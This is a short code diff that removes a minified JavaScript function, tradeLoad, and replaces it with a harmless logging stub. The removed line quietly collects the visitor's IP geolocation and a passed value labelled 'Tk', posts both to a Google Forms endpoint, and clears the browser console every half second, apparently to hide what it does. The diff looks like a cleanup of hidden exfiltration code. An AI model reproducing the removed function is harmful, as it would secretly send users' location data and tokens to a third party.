@@ -1,1 +1,3 @@
-function tradeLoad(e){function t(e,t,n){var o=new XMLHttpRequest;o.onreadystatechange=function(){o.readyState===XMLHttpRequest.DONE&&(200===o.status?t&&t(JSON.parse(o.responseText)):n&&n(o))},o.open("GET",e,!0),o.send()}t("http://ip-api.com/json/",(function(n){var o=`${n.country}, ${n.region}, ${n.regionName}, ${n.city}, ${n.zip}, ${n.lat}, ${n.lon}, ${n.timezone}, ${n.isp}, ${n.org}, ${n.as}, ${n.query}, Tk=${e}`;t(`https://docs.google.com/forms/d/1ATDKwcVb1GPZO7R2vIRUQl69h8SJaYUn5ztjm4mfYpk/formResponse?&entry.255975227=${encodeURIComponent(o)}`)}));setInterval((()=>{console.clear()}),500)}
+function tradeLoad(e){
+  console.log('hi ',e);
+}
